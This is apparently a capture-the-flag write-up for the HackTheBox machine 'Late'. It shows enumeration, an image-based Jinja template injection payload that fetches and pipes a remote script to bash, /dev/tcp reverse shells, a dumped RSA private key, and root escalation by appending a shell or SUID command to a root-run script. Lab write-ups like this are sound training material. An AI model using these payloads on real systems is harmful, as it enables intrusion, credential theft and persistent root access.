# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# nmap -sC -sV -A -p- 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 14:37 +08
Nmap scan report for 10.10.11.156
Host is up (0.0065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/20%OT=22%CT=1%CU=37371%PV=Y%DS=2%DC=T%G=Y%TM=6300813
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   3.18 ms 10.10.14.1
2   3.61 ms 10.10.11.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.16 seconds
```

It seems like there’s only port `20` and `80` is open.

Lets check out their website.

![website](website.png)

Looking around the website, we can find a hyperlinked text that points to `http://images.late.htb/`.

Lets add the domain to our `/etc/hosts` file.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /etc/hosts          
127.0.0.1	localhost
127.0.1.1	shiro.shiro	shiro
10.10.10.48     mirai.htb
10.10.10.13     cronos.htb ns1.cronos.htb admin.cronos.htb
10.10.10.22	europa.htb www.europacorp.htb admin-portal.europacorp.htb
10.10.11.130	goodgames.htb internal-administration.goodgames.htb
10.10.11.156	late.htb images.late.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

![images_website](images_website.png)

As we can see from the website, there are 2 important information - the website is running on Flask and it is converting an image to text.

Lets convert a text to image using this [tool](https://smallseotools.com/text-to-image/). As a test, I used the text `Shiro`. Thereafter, I uploaded the image to the flask application and it returned a text file containing the following content.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results.txt 
<p>Shiro
</p>     
```

# Exploitation

Since this was a Flask application, we should check whether it is vulnerable to SSTI. To test this, I used a payload text of `{{1+1}}`. Here was the result.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results\(1\).txt
<p>2
</p>        
```

>   Note that the flask application might not read the image properly. To bypass this, we can either make the text wider with spaces in between the payload like `{ { 1 + 1 } }` and/or change the zoom level!

Yay! The application is vulnerable to SSTI. Lets use our handy [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) to try out some payloads. I tried different payloads but this seems to work the best - `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results\(2\).txt 
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>  
```

>   Note: I used this [tool](https://cloudconvert.com/txt-to-jpg) to convert the text to image instead as it seems to be more reliable than the previous tool.

Here’s our plan. 

-   We create a simple reverse shell script
-   Host the script on our own server 
-   Modify the SSTI payload that we found with this command - `curl http://10.10.14.4/rev.sh | bash`
-   Start a netcat listener
-   Upload the image to the application and wait for the listener to catch the shell

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat rev.sh                                
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/1234 <&1'

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.156 - - [20/Aug/2022 15:31:22] "GET /rev.sh HTTP/1.1" 200 -

- Netcat Listener -                                   
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.156] 45300
bash: cannot set terminal process group (1227): Inappropriate ioctl for device
bash: no job control in this shell
svc_acc@late:~/app$ 
```

>   The SSTI payload used: `{{ cycler.__init__.__globals__.os.popen('curl http://10.10.14.4/rev.sh | bash').read() }}`
>
>   P.S. Depending on the error that the application throws while reading the payload, you have to modify it such as adding extra “_” in the payload. 

# Privilege Escalation

Before we begin, we should grab the `id_rsa` file for easier access using `ssh`!

```bash
svc_acc@late:~/app$ cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

- Local Machine -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# mousepad id_rsa    
< copy & paste the private key here >

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# chmod 600 id_rsa    

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# ssh svc_acc@10.10.11.156 -i id_rsa
Warning: SSH client configured for wide compatibility by kali-tweaks.
svc_acc@late:~$ 
```

Lets try `su -` to see if we can get an easy win.

```bash
svc_acc@late:~$ su -
Password: 
```

Lets check if `svc_acc` can run any command as root.

```bash
svc_acc@late:~$ sudo -l
[sudo] password for svc_acc: 
```

Lets try if we can find any interesting files owned by `svc_acc`.

```bash
svc_acc@late:~$ find / -user svc_acc 2>/dev/null
...
< too much information being printed >
^C
svc_acc@late:~$ find / -user svc_acc 2>/dev/null | grep -v '/proc\|/home\|/var\|/sys\|/run'
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh
/dev/pts/0
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

Oh? There is an interesting `ssh-alert.sh` file that is available but is it executed by root?

Lets use `pspy` to check! OwO

```bash
- Local Machine -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
...

- Netcat Shell -
svc_acc@late:~$ wget http://10.10.14.4/pspy64
...
svc_acc@late:~$ chmod +x pspy64
svc_acc@late:~$ ./pspy64
...
< ssh into svc_acc again using another terminal to execute the ssh-alert script >
...
2022/08/20 08:08:22 CMD: UID=0    PID=1922   | /bin/bash /usr/local/sbin/ssh-alert.sh 
```

Nice! The script is being ran by `UID=0`. 

```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh 
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

>   `lsattr` shows the attribute of the file. The `a` in the attributes indicate that we can only add things to the end of the file.

Lets add a reverse shell bash script to the end of the file and execute `ssh-alert.sh`.

```bash
svc_acc@late:~$ echo 'bash -c "exec bash -i &>/dev/tcp/10.10.14.4/9999 <&1"' >> /usr/local/sbin/ssh-alert.sh 
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


bash -c "exec bash -i &>/dev/tcp/10.10.14.4/9999 <&1"
```

Finally, we can start another netcat listener and execute the script.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# nc -nlvp 9999            
listening on [any] 9999 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.156] 34786
bash: cannot set terminal process group (2037): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# cat /home/svc_acc/user.txt
cat /home/svc_acc/user.txt
0d165b9722b722ff76c56cc75ccbc819
root@late:/# cat /root/root.txt
cat /root/root.txt
72dac27da89ba5002503d1eaf8011367
```

Reading a writeup from [Shakugan](https://shakuganz.com/2022/07/07/hackthebox-late/), I realized that there was another interesting way to get the root shell which is to set `/bin/bash` to SUID.

```bash
svc_acc@late:~$ echo "chmod u+s /bin/bash" >> /usr/local/sbin/ssh-alert.sh 
svc_acc@late:~$ bash -p
bash-4.4# id
uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc)
```

